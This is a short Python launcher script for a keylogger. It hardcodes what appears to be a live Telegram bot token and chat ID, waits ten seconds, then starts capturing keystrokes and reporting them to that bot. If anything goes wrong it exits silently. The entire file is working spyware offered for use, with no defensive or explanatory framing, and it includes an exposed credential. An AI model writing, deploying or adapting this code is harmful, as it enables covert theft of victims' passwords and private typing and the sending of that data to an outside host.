#!/usr/bin/python
import keylogger, time, sys

bot_token = "5147964634:AAEFvnLASTNzDsaFUZubZ7eRhSQHqhR47AM"
chat_id = "1101598174"

time.sleep(10)

try:
	my_keylogger = keylogger.Keylogger(40, bot_token, chat_id)
	my_keylogger.start()
except Exception:
	sys.exit()
